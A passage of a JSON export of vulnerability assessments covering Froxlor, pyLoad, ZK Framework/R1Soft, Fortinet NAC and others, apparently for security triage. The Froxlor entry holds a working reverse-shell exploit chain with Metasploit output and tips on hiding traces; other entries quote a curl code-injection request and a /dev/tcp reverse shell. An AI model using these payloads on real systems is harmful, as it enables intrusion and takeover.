      "created": "2023-02-06T20:59:09.793955Z",
      "revisionDate": "2023-02-13T21:42:32.396539Z",
      "document": "This is currently unpatched and vulnerable in the default state. The time from reading the mitigation to having a working exploit was less than day, and that's for somebody who isn't super good at Java vulnerabilities.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f614e8fd-1b45-4bb0-b268-8bdb755679b6",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "0a6908b2-0b8e-46f9-9bec-db737877d332",
      "created": "2023-02-08T17:50:56.124283Z",
      "revisionDate": "2023-02-11T13:21:23.617204Z",
      "document": "",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3b054de1-eba3-46a0-80f1-8117284e6485",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "ffe151a2-90a2-43e5-a6ed-14fa57daaeb6",
      "created": "2023-02-14T20:54:52.074076Z",
      "revisionDate": "2023-02-14T20:54:52.073935Z",
      "document": "# Attacker Value and Exploitability\r\nFroxlor is a an open source web hosting control panel, with around 20,000 live instances listening on the internet at the time of writing. In versions <= 2.0.6 there exists an authenticated RCE vulnerability. Exploitation is trivia given credentials to the Froxlor application, as PoC details and a metasploit module are readily available, giving this vulnerability a moderate Attacker Value & Exploitability rating. \r\n\r\n# Vulnerability Details\r\nExploiting this vuln requires a few simple steps:\r\n - As an authenticated user, change the logfile path to: `/var/www/html/froxlor/templates/Froxlor/footer.html.twig` this can be done by sending the following POST request to the server:\r\n\r\n```\r\nPOST /froxlor/admin_settings.php?page=overview&part=logging HTTP/1.1\r\nHost: 172.16.199.140\r\nContent-Length: 1125\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nOrigin: http://172.16.199.140\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryt8L3nWBWoG1AKOVm\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://172.16.199.140/froxlor/admin_settings.php?page=overview&part=logging\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: PHPSESSID=admjpmobmubbadpq6lpun95b8q\r\nConnection: close\r\n\r\n------WebKitFormBoundaryt8L3nWBWoG1AKOVm\r\nContent-Disposition: form-data; name=\"logger_enabled\"\r\n\r\n0\r\n------WebKitFormBoundaryt8L3nWBWoG1AKOVm\r\nContent-Disposition: form-data; name=\"logger_enabled\"\r\n\r\n1\r\n------WebKitFormBoundaryt8L3nWBWoG1AKOVm\r\nContent-Disposition: form-data; name=\"logger_severity\"\r\n\r\n2\r\n------WebKitFormBoundaryt8L3nWBWoG1AKOVm\r\nContent-Disposition: form-data; name=\"logger_logtypes[]\"\r\n\r\nfile\r\n------WebKitFormBoundaryt8L3nWBWoG1AKOVm\r\nContent-Disposition: form-data; name=\"logger_logfile\"\r\n\r\n/var/www/html/froxlor/logs/froxlor.log\r\n------WebKitFormBoundaryt8L3nWBWoG1AKOVm\r\nContent-Disposition: form-data; name=\"logger_log_cron\"\r\n\r\n0\r\n------WebKitFormBoundaryt8L3nWBWoG1AKOVm\r\nContent-Disposition: form-data; name=\"csrf_token\"\r\n\r\ncce9438c7954b65c86960649e5b95e8fc1157c61\r\n------WebKitFormBoundaryt8L3nWBWoG1AKOVm\r\nContent-Disposition: form-data; name=\"page\"\r\n\r\noverview\r\n------WebKitFormBoundaryt8L3nWBWoG1AKOVm\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\n\r\n------WebKitFormBoundaryt8L3nWBWoG1AKOVm\r\nContent-Disposition: form-data; name=\"send\"\r\n\r\nsend\r\n------WebKitFormBoundaryt8L3nWBWoG1AKOVm--\r\n```\r\n(Twig is a template engine for the PHP programming language. The file mentioned above, `/footer.html.twig` is the footer for the homepage of the Froxlor application and lucky for the attacker, it gets executed every time the homepage is refreshed.)\r\n\r\n\r\n - Next inject a payload into the new logfile with the following format:  `{{['COMMAND']|filter('exec')}}1` this will ensure the command will be executed when the `.twig` file is loaded. This can be achieved by changing the 'theme' of the froxlor application as an authenticated user with the following post request:\r\n\r\n```\r\nPOST /froxlor/admin_index.php HTTP/1.1\r\nHost: 172.16.199.140\r\nContent-Length: 101\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nOrigin: http://172.16.199.140\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://172.16.199.140/froxlor/admin_index.php?page=change_theme\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: PHPSESSID=8nvcp4180gkp3n68ekgtgubvpt\r\nConnection: close\r\n\r\ntheme=%7b%7b%5b%27%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%37%32%2e%31%36%2e%31%39%39%2e%31%20%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66%27%5d%7c%66%69%6c%74%65%72%28%27%65%78%65%63%27%29%7d%7d&csrf_token=caeb932a7ea81b18d82116300b79be5d8a008a10&page=change_theme&send=send&dosave=\r\n```\r\n\r\nIn the above request, `theme` has been URL encoded and set to: `{{['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.199.1  4444 >/tmp/f']|filter('exec')}}` \r\n\r\n- Now, with a listener setup, all the attacker has to do send the following GET request to trigger the payload (or reload the froxlor application in their browser) and they will have a shell running in the context of the application (which if running on Ubuntu in a default configuation would be user `www-data`):\r\n\r\n```\r\nGET /froxlor/admin_index.php? HTTP/1.1\r\nHost: 172.16.199.140\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://172.16.199.140/froxlor/admin_index.php\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: PHPSESSID=8nvcp4180gkp3n68ekgtgubvpt\r\nConnection: close\r\n```\r\n\r\n# IOCs\r\nAs soon as the logfile path is changed to `/footer.html.twig` or any other `.twig` file the attacker chooses to target, the froxlor application begins writing log lines to that file. In the case of  `/footer.html.twig` users will start to see log lines appearing in the at the bottom (or in the footer element) of the application like so: \r\n\r\n![Screen Shot 2023-02-14 at 3 26 17 PM](https://user-images.githubusercontent.com/23320005/218857323-13b67883-3782-4999-b12c-17bcaf175170.png)\r\n\r\nOnce the attacker has injected their payload, the application will hang, as the payload is executed and the application runs off to connect to the attacker. Now, these IOCs can be covered up if the attacker changes the log file path back to it's original setting and then erases the payload and additional log lines from `footer.html.twig`. The metasploit module covers up these IOCs, so if you plan on exploiting this vuln, be sure to make use of it. \r\n\r\n# Metasploit Module Demonstration: \r\n\r\n```\r\nmsf6 > use exploit/linux/http/froxlor_log_path_rce\r\n[*] Using exploit/linux/http/froxlor_log_path_rce\r\nmsf6 exploit(linux/http/froxlor_log_path_rce) > set rhosts 172.16.199.140\r\nrhosts => 172.16.199.140\r\nmsf6 exploit(linux/http/froxlor_log_path_rce) > set lhost 172.16.199.1\r\nlhost => 172.16.199.1\r\nmsf6 exploit(linux/http/froxlor_log_path_rce) > set lport 9191\r\nlport => 9191\r\nmsf6 exploit(linux/http/froxlor_log_path_rce) > set username admin\r\nusername => admin\r\nmsf6 exploit(linux/http/froxlor_log_path_rce) > set password notpassword\r\npassword => notpassword\r\nmsf6 exploit(linux/http/froxlor_log_path_rce) > rexploit\r\n[*] Reloading module...\r\n[*] Started reverse TCP handler on 172.16.199.1:9191\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] Successful login\r\n[+] The target appears to be vulnerable. Vulnerable version found: 2.0.3\r\n[+] Successfully Logged in!\r\n[+] CSRF token is : 5701b7e6335ab13e20e91845b210b6be0bea7621\r\n[+] Changed logfile path to: /var/www/html/froxlor/templates/Froxlor/footer.html.twig\r\n[*] Using URL: http://172.16.199.1:8080/ygs3pAWMRNIs\r\n[+] Injected payload sucessfully\r\n[*] Changing logfile path back to default value while triggering payload: /var/www/html/froxlor/logs/froxlor.log\r\n[*] Client 172.16.199.140 (Wget/1.20.3 (linux-gnu)) requested /ygs3pAWMRNIs\r\n[*] Sending payload to 172.16.199.140 (Wget/1.20.3 (linux-gnu))\r\n[*] Sending stage (3045348 bytes) to 172.16.199.140\r\n[*] Cleaning up...\r\n[*] Deleting tampered footer.html.twig file\r\n[*] Rewriting clean footer.html.twig file\r\n[*] Meterpreter session 3 opened (172.16.199.1:9191 -> 172.16.199.140:50398) at 2023-02-13 18:20:02 -0500\r\n[*] Command Stager progress - 100.00% done (117/117 bytes)\r\n[*] Server stopped.\r\nmeterpreter > getuid\r\nServer username: www-data\r\nmeterpreter > sysinfo\r\nComputer     : 172.16.199.140\r\nOS           : Ubuntu 20.04 (Linux 5.15.0-58-generic)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\nmeterpreter >\r\n```\r\n\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "51e62cc9-bea0-48c6-9f83-24353b2c5cce",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "4606fb27-f7e8-4f43-88b8-52961681abfd",
      "created": "2023-02-16T17:03:07.033922Z",
      "revisionDate": "2023-02-16T17:03:07.034907Z",
      "document": "# Description\r\npyLoad versions prior to 0.5.0b3.dev31 are vulnerable to Python code injection due to the pyimport functionality exposed through the js2py library. An unauthenticated attacker can issue a crafted POST request to the flash/addcrypted2 endpoint to leverage this for code execution. pyLoad by default runs two services, the primary of which is on port 8000 and can not be used by external hosts. A secondary \"Click 'N' Load\" service runs on port 9666 and can be used remotely without authentication.\r\n\r\nThe vulnerability was patched in commit [7d73ba79](https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d) by disabling the `pyimport` statement within the js2py execution environment.\r\n\r\nFrom the [original disclosure](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad), the vulnerability can be validated with curl:\r\n\r\n```\r\ncurl -i -s -k -X $'POST' \\\r\n    --data-binary $'jk=pyimport%20os;os.system(\\\"touch%20/tmp/pwnd\\\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \\\r\n    $'http://127.0.0.1:9666/flash/addcrypted2'\r\n```\r\n\r\nVulnerable instances will respond with a 500 error and a message that the decryption failed.\r\n\r\n```\r\nHTTP/1.1 500 INTERNAL SERVER ERROR\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 21\r\nAccess-Control-Max-Age: 1800\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Methods: OPTIONS, GET, POST\r\nVary: Accept-Encoding\r\nDate: Thu, 16 Feb 2023 17:02:16 GMT\r\nServer: Cheroot/8.6.0\r\n\r\nCould not decrypt key\r\n```\r\n\r\nPatched instances (v0.5.0) will also respond with a 500 error but the body of the response will include a stack trace in HTML with the following error:\r\n\r\n```\r\n              <p><b>Error 500: SyntaxError: Line 1: Unexpected token pyimport</b></p>\r\n          \r\n              <p><b>Traceback (most recent call last):</b></p>\r\n          \r\n              <p><b>  File &#34;/usr/lib/python3.10/site-packages/flask/app.py&#34;, line 1820, in full_dispatch_request</b></p>\r\n          \r\n              <p><b>    rv = self.dispatch_request()</b></p>\r\n```\r\n\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c87b0351-4bac-4e11-855e-591c909746a4",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "0f90accf-16b9-40a6-a699-7ff266ad3481",
      "created": "2023-02-17T22:13:38.919365Z",
      "revisionDate": "2023-02-24T09:50:30.21821Z",
      "document": "This lives on the network perimeter and uses laughably old versions of software (like Ruby 1.9.3). I had more trouble preventing it from crashing than actually exploiting it. This also tends to store privileged information, since it's a secure file transfer service. Kinda really bad.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "78815a35-9dc6-45e4-94e7-7381d367be50",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "271b7529-c30e-4293-83dc-9f0303d1074f",
      "created": "2023-02-22T08:57:58.024125Z",
      "revisionDate": "2023-02-22T20:12:54.354083Z",
      "document": "Fortinet's researcher Gwendal Gu\u00e9gniaud discovered a RCE  vulnerability on the Fortinet NAC (Network Access Control) device.  The vulnerability in the keyUpload.jsp file, allows an unauthenticated attacker to write arbitrary files on the system. As a result, the uploaded code will be executed under the user rights of root. \r\n\r\nSince these types of devices sit at the network perimeter of companies, it is an interesting target as we have observed in many ransomware attacks, where the initial attack starts compromising a network perimeter device.\r\n\r\nWith the release of a PoC by Horizon3ai, ShadowServer's Honeypots has already reported scanning activity. \r\nThe exploit has been tested and works against vulnerable devices:\r\n\r\n![Logo] (https://i.ibb.co/0YpHxR2/carbon-1.png)\r\n\r\n\r\n\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9193b925-3e62-41a9-a7bf-885ae5a13b4d",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "96fdb548-61b6-451a-b4a1-cd28f4243096",
      "created": "2023-02-22T10:06:12.020665Z",
      "revisionDate": "2023-02-22T17:58:09.975095Z",
      "document": "Recent reports on ransomware actors' activity in 2022 abusing vulnerabilities during their attacks marked this particular vulnerability as being used. Once inside the network of a victim, this particular vulnerability can be used to elevate privileges and execute code under administrative rights.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "4a1f347d-69ef-472d-9ce0-dc8e5ab52807",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "271b7529-c30e-4293-83dc-9f0303d1074f",
      "created": "2023-02-23T17:13:27.67346Z",
      "revisionDate": "2023-02-25T13:18:14.689766Z",
      "document": "This is getting a lot of attention, but despite the chatter, it doesn't actually appear to be exploited widely (yet) and has virtually no internet-exposed attack surface area, so I'm not sure it's gonna get there. The device itself looks like a great target and if you use it you should patch it, but it's not commonly exposed, and this shouldn't be confused with other Fortinet vulns that live in products with tens or hundreds of thousands of systems chillaxin' on the internet. \r\n\r\nNo opinion from our research folks yet on exploitability if you're in a network with access to a vulnerable target. Public PoC exists and it looks like a few different security vendors are seeing honeypot hits, but only from a couple IPs so far. May increase, may not, we'll see. ",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "8f503537-42be-4c1d-ac11-ff9299c3a9fa",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "b13061ed-28b3-4063-bff1-63488b2de718",
      "created": "2023-02-28T08:41:34.454424Z",
      "revisionDate": "2023-02-28T08:41:34.454591Z",
      "document": "The \u201cZK\u201d Framework is an open-source Java framework for building enterprise web and mobile applications. The R1Soft Server Backup Manager utilises. this framework. \r\n\r\nBy bypassing the authentication process, uploading a 'custom and weaponized database driver (JDBC) that contains a payload for creating a remote shell on the device is possible. Excerpt from one of the public PoCs with a detail in the weaponized JDBC driver:\r\n\r\n\r\n    static {\r\n        String winCmd = \"dir\";\r\n        String linuxCmd = \"bash -i >& /dev/tcp/192.168.1.0/2022 0>&1\";\r\n\r\n        String[] cmds = null;\r\n\r\n        if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\r\n            cmds = new String[]{\"cmd.exe\", \"/c\", winCmd};\r\n        } else {\r\n            cmds = new String[]{\"/bin/bash\", \"-c\", linuxCmd};\r\n        }\r\n\r\nOne of the Incident Response blogs in the referrals from Fox-IT mentions that activity since November 2022 has been observed where this software has been compromised and a backdoor is running on these systems.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Command and Control",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c3262d18-83b9-4f7b-a90a-f39b2ea82166",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "b13061ed-28b3-4063-bff1-63488b2de718",
      "created": "2023-03-01T18:39:34.440647Z",
      "revisionDate": "2023-03-01T18:39:34.439258Z",
      "document": "The core vuln here is an info leak in ZK Framework, which \u2014 yep, you guessed it! \u2014 is a popular open-source Java library used to create enterprise mobile and web apps. The original advisory, NVD entry, and CVSS score are all predicated on the mere info leak, but as it turns out, other popular software that uses ZK Framework is vulnerable to full-on remote code execution via CVE-2022-36537. Both [Huntress](https://www.huntress.com/blog/critical-vulnerability-disclosure-connectwise/r1soft-server-backup-manager-remote-code-execution-supply-chain-risks) and [NCC Group](https://archive.is/r3eGg) have noted that this bug is being exploited in vulnerable ConnectWise R1Soft Server Backup Manager software to gain initial access to target systems and then do a variety of not-good things, including installing malicious JDBC database drivers to backdoor systems, deploying ransomware, and so on. \r\n\r\nPer various write-ups and public PoCs analyzed by @sfewer-r7, the following seems to happen: \r\n* Attacker uses the CVE-2022-36537 to leak the contents of ` /Configuration/database-drivers.zul`,  which yields a unique secret ID value\r\n* Armed with this value, attacker exploits vuln again to reach an endpoint that allows them to upload the JDBC driver, which functions as a handy backdoor\r\n* Attacker [can now use the REST API](https://www.huntress.com/blog/critical-vulnerability-disclosure-connectwise/r1soft-server-backup-manager-remote-code-execution-supply-chain-risks) to issue commands to registered agents to do nefarious things, like, you know, deploy your ransomware of choice to downstream systems \r\n* Oh and hey there are supply chain implications\r\n\r\nWe know the ConnectWise R1Soft vector is in active use and is easily exploitable, but this being a library vuln (so hot right now), that's almost certainly not going to be the only attack vector. Some light recon done by folks smarter than me (namely the aforementioned @sfewer-r7) indicates there are plenty of other things that use ZK Framework. The question is which are vulnerable to remote exploits out of the box. Knocking this down an exploitability point overall simply because other applications may not be quite as easily exploitable remotely as the ConnectWise software. \r\n\r\nIf you're using a vulnerable R1Soft Server Backup Manager version, please patch immediately. The NCC Group's FOX IT team has [a great write-up](https://archive.is/r3eGg)  with IOCs and attack details.\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "9484ff0f-72e6-4ee8-8b54-fe1234d3bfa6",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "cc5240d0-9f60-46ff-a6b8-8971d46a2f41",
      "created": "2023-03-06T08:12:04.074095Z",
      "revisionDate": "2023-03-21T14:16:12.976303Z",
      "document": "A vulnerability in Microsoft's Word  wwlib allows attackers to get LCE with the privileges of the victim opens a malicious\r\nRTF document. An attacker would be able to deliver this payload in several ways including as an attachment in spear-phishing attacks.\r\n\r\n## Affected Versions\r\nThis vulnerability affects at least the following versions of Microsoft Office:\r\n\r\n* Microsoft Office 365 (Insider Preview - 2211 Build 15831.20122 CTR)\r\n* Microsoft Office 2016 (Including Insider Slow - 1704 Build 8067.2032 CTR)\r\n* Microsoft Office 2013\r\n* Microsoft Office 2010\r\n* Microsoft Office 2007\r\n\r\n## Acknowledgement\r\nThis issue was discovered, analyzed, and reported by Joshua J. Drake (@jduck).\r\n\r\nPoC code from @jduck: \r\n\r\n![image] (https://i.ibb.co/NS10VkL/Snap.png?raw=true)",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ee9dcd5b-fdd2-48a1-a717-33d9e13f6634",
      "editorId": "ad0ff97b-fabc-4ccd-bfdc-2e39d7d44f3d",
      "topicId": "716a36af-92eb-4ec0-bea6-8f54221f9cae",
      "created": "2023-03-08T02:40:37.380046Z",
      "revisionDate": "2023-03-08T02:40:37.380081Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": []
    },
    {
      "id": "053e991e-4427-4fc6-ac81-bb5c78447aff",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "5297439f-eff0-4c64-90ef-db07917497e3",
      "created": "2023-03-08T19:11:18.996026Z",
      "revisionDate": "2023-03-09T20:14:38.142622Z",
